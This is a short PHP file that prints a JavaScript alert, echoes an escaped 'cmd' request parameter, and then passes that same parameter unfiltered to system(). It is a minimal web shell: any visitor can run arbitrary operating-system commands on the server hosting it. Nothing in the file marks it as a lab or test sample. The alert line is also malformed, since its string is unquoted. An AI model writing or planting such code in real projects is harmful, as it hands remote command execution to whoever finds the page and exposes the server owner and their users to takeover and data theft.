<?php
echo "<script>alert(Well hello !!);</script>";
echo "Run command: ".htmlspecialchars($_GET['cmd']);

system($_GET['cmd']);
?>
